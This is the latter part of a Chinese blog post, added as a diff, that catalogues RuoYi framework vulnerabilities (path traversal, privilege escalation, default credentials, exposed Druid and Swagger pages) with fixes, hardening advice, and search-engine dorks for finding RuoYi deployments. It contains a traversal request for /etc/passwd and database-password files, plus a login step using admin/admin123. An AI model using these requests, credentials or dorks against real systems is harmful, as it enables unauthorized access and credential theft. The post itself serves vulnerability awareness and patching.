+          <th>CVE-2023-27025</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt;= v4.7.6</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>路径穿越/文件下载</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>高危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>文件下载接口 /common/download/resource 对文件路径校验不严格，攻击者可通过 ../ 目录穿越访问服务器上的任意文件，包括配置文件（含数据库密码）、源代码等敏感信息。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>构造路径穿越请求：/common/download/resource?resource=/profile/../../../../etc/passwd</p>
+</li>
+<li>
+<p>绕过文件路径白名单限制</p>
+</li>
+<li>
+<p>下载 application.yml（含数据库密码）等敏感文件</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>升级到 RuoYi &gt;= 4.7.7；对文件下载路径进行严格白名单限制和规范化处理；禁止 ../ 等目录穿越字符。</p>
+<h1 id="4-权限提升与安全绕过---高危-">4. 权限提升与安全绕过  [ 高危 ]</h1>
+<h2 id="11-权限提升漏洞joblogid-参数">11. 权限提升漏洞（jobLogId 参数）</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>CVE-2025-28406</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>v4.8.0</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>权限提升</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>高危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>远程攻击者可利用 jobLogId 参数实现权限提升，组件白名单的 getBeanName 函数存在缺陷，低权限用户可越权访问或操作本不可见的定时任务日志/资源。</p>
+<p>利用方式</p>
+<p>通过构造包含特定 jobLogId 参数的请求，越权访问或操作高权限资源。</p>
+<p>修复建议</p>
+<p>升级到 RuoYi &gt; v4.8.0；对 getBeanName 函数增加严格的权限校验。</p>
+<h2 id="12-白名单-getbeanname-函数绕过">12. 白名单 getBeanName 函数绕过</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>CVE-2025-0734</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>v4.8.0</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>安全绕过</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>高危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>若依 4.8.0 白名单组件中 getBeanName 函数存在安全缺陷，攻击者可绕过白名单限制执行未授权操作。</p>
+<p>利用方式</p>
+<p>通过构造特殊请求绕过白名单检查机制，执行未授权的 Bean 调用。</p>
+<p>修复建议</p>
+<p>升级至官方修复版本；加强白名单校验逻辑。</p>
+<h2 id="13-权限提升漏洞">13. 权限提升漏洞</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>CVE-2025-56396</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt;= v4.8.1</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>权限提升</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>严重</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>RuoYi 4.8.1 版本存在权限提升漏洞，低权限攻击者可利用该漏洞通过特定请求提升至管理员权限，获得更高的系统权限。</p>
+<p>利用方式</p>
+<p>低权限攻击者通过特定请求构造，提升至管理员权限。</p>
+<p>修复建议</p>
+<p>升级到修复后版本，加强后端权限校验逻辑。</p>
+<h1 id="5-认证与配置缺陷---中危高危-">5. 认证与配置缺陷  [ 中危~高危 ]</h1>
+<h2 id="14-默认弱口令-adminadmin123">14. 默认弱口令 admin/admin123</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>无</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>所有版本</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>默认凭据</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>高危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>若依系统默认管理员账户使用弱口令 admin/admin123，大量部署实例未修改默认密码，攻击者无需破解即可直接获得后台管理权限，进而利用后台定时任务等功能深入攻击。</p>
+<p>利用方式</p>
+<p>直接使用 admin/admin123 登录后台管理系统，获取所有管理权限。</p>
+<p>修复建议</p>
+<p>部署后立即修改所有默认密码；强制密码复杂度策略（至少12位）；启用登录失败锁定；集成 OAuth2 或多因素认证。</p>
+<h2 id="15-druid-监控页面未授权访问">15. Druid 监控页面未授权访问</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>无</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>多版本（配置相关）</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>未授权访问/信息泄露</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>中危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>若依默认集成 Druid 数据源监控，部分版本/配置下未对 Druid 监控页面进行鉴权保护，可查看 SQL 执行记录、数据源信息、Session 信息等敏感数据。</p>
+<p>利用方式</p>
+<p>直接访问 /druid/index.html，获取 SQL 执行记录、数据源配置、Session 等信息。</p>
+<p>修复建议</p>
+<p>在 ShiroConfig 或 Spring Security 配置中对 /druid/** 路径添加认证拦截；或在 Druid 配置中启用登录认证。</p>
+<h2 id="16-swagger-接口文档未授权访问">16. Swagger 接口文档未授权访问</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>无</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>多版本（配置相关）</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>未授权访问/信息泄露</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>中危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>若依集成 Swagger API 文档，未做访问控制时可被外部访问，获取全部 API 接口定义，辅助进一步攻击。</p>
+<p>利用方式</p>
+<p>访问 /swagger-ui.html 或 /swagger-resources 等路径，获取全部 API 接口定义。</p>
+<p>修复建议</p>
+<p>生产环境禁用 Swagger，或为 Swagger 路径添加认证要求。</p>
+<h2 id="17-多个安全漏洞v480-集中披露">17. 多个安全漏洞（v4.8.0 集中披露）</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE 编号</th>
+          <th>CVE-2024-57436 ~ 57439</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>v4.8.0</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>信息泄露/安全缺陷</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>中危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>4.8.0 版本同时披露了四个 CVE，其中 CVE-2024-57439 允许未经授权的攻击者在系统监控中查看 admin 的会话 ID，可能导致会话劫持。其余 CVE 涉及类似的安全缺陷和信息泄露问题。</p>
+<p>利用方式</p>
+<p>通过系统监控接口查看 admin 会话 ID，可能进行会话劫持等攻击。</p>
+<p>修复建议</p>
+<p>升级到 RuoYi &gt; v4.8.0 的修复版本。</p>
+<h1 id="通用安全加固建议">通用安全加固建议</h1>
+<table>
+  <thead>
+      <tr>
+          <th>序号</th>
+          <th>措施</th>
+          <th>说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>及时升级版本</td>
+          <td>始终使用若依最新稳定版本，关注官方 Gitee/GitHub 仓库的安全更新公告，第一时间应用安全补丁。</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>修改默认配置</td>
+          <td>部署时必须修改默认管理员密码（admin/admin123）、替换 Shiro 加密密钥为随机生成的高强度密钥、关闭不必要的调试组件。</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>参数化查询</td>
+          <td>所有 SQL 操作使用 #{} 参数化方式，全面排查和替换 ${} 字符串拼接。特别关注 orderByColumn、dataScope 等动态排序/过滤参数。</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>定时任务安全加固</td>
+          <td>对 invokeTarget 采用严格白名单策略，仅允许调用预定义的安全 Bean 方法；彻底移除类全路径实例化执行逻辑。</td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td>生产环境加固</td>
+          <td>删除代码生成模块（ruoyi-generator）；禁用 Druid 监控页面的公开访问；关闭 Swagger 文档；关闭 Actuator 非必要端点。</td>
+      </tr>
+      <tr>
+          <td>6</td>
+          <td>文件操作安全</td>
+          <td>文件下载/读取接口实施严格路径白名单，禁止目录穿越；对所有文件操作接口的路径参数进行规范化处理。</td>
+      </tr>
+      <tr>
+          <td>7</td>
+          <td>JDK 版本升级</td>
+          <td>使用高版本 JDK（&gt;= 8u191）以缓解 JNDI 注入风险。高版本默认禁止远程 Reference 工厂类加载。</td>
+      </tr>
+      <tr>
+          <td>8</td>
+          <td>网络层防护</td>
+          <td>部署 WAF 对 SQL 注入、反序列化、SSTI 等攻击进行拦截；运行若依的系统用户应使用最小权限，避免以 root 运行。</td>
+      </tr>
+  </tbody>
+</table>
+<h1 id="附录若依资产发现语法">附录：若依资产发现语法</h1>
+<p>在渗透测试和攻防演练中，快速识别若依资产是第一步。以下是常用的搜索引擎语法：</p>
+<table>
+  <thead>
+      <tr>
+          <th>平台</th>
+          <th>搜索语法 / 识别特征</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>FOFA</td>
+          <td>app=&ldquo;若依&rdquo; 或 body=&ldquo;若依管理系统&rdquo; 或 body=&ldquo;ruoyi&rdquo; 或 icon_hash=&ldquo;706913071&rdquo;</td>
+      </tr>
+      <tr>
+          <td>鹰图</td>
+          <td>web.body=&ldquo;若依&rdquo; || web.title=&ldquo;若依管理系统&rdquo;</td>
+      </tr>
+      <tr>
+          <td>Google</td>
+          <td>intitle:&ldquo;若依管理系统&rdquo; inurl:&quot;/login&quot;</td>
+      </tr>
+      <tr>
+          <td>特征识别</td>
+          <td>登录页面含&quot;若依管理系统&quot;字样；Cookie 含 rememberMe 字段（Shiro）；/druid/index.html 可访问</td>
+      </tr>
+  </tbody>
+</table>
+<h1 id="参考来源">参考来源</h1>
+<ul>
+<li>
+<p>博客园 - 若依(RuoYi)框架漏洞总结 (backlion)</p>
+</li>
+<li>
+<p>知乎 - RuoYi框架部分历史漏洞</p>
+</li>
+<li>
+<p>腾讯云 - CVE-2024-57521 RuoYi v4.7.9 SQL注入漏洞</p>
+</li>
+<li>
+<p>阿里云漏洞库 - RuoYi 相关 CVE</p>
+</li>
+<li>
+<p>神龙漏洞库 - y_project 厂商 CVE 列表</p>
+</li>
+<li>
+<p>GitHub - SecurityList/RuoYi.md</p>
+</li>
+<li>
+<p>Gitee - 若依官方 Issues</p>
+</li>
+<li>
+<p>CN-SEC - 若依系统常见漏洞整理</p>
+</li>
+<li>
+<p>ZONE.CI - Ruoyi单应用版本漏洞合集</p>
+</li>
+<li>
+<p>CSDN - 若依框架安全自查清单</p>
+</li>
+</ul></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2026-05-01</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ruoyi/">Ruoyi</a>,&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/uni-app-x%E7%A6%BB%E7%BA%BF%E6%89%93%E5%8C%85%E6%B5%81%E7%A8%8B/" class="prev" rel="prev" title="uni-app-x离线打包流程"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>uni-app-x离线打包流程</a>
+            <a href="/posts/hugo%E7%BB%98%E5%88%B6echarts%E5%9B%BE%E8%A1%A8/" class="next" rel="next" title="hugo绘制echarts图表">hugo绘制echarts图表<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.154.3">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"rTeTnudkYwu3cz5ejsdiKdFm-gzGzoHsz","appKey":"SfE7A8tmPKu2F6Pf5LMUewa4","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@15.1.2/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-CN","meta":["nick","mail"],"pageSize":10,"placeholder":"在这里留下足迹吧!","recordIP":true,"visitor":true}},"search":{"algoliaAppID":"CT9HNMDY0J","algoliaIndex":"hugo","algoliaSearchKey":"e48b980a6aaab08129f8a8d9a425c47b","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
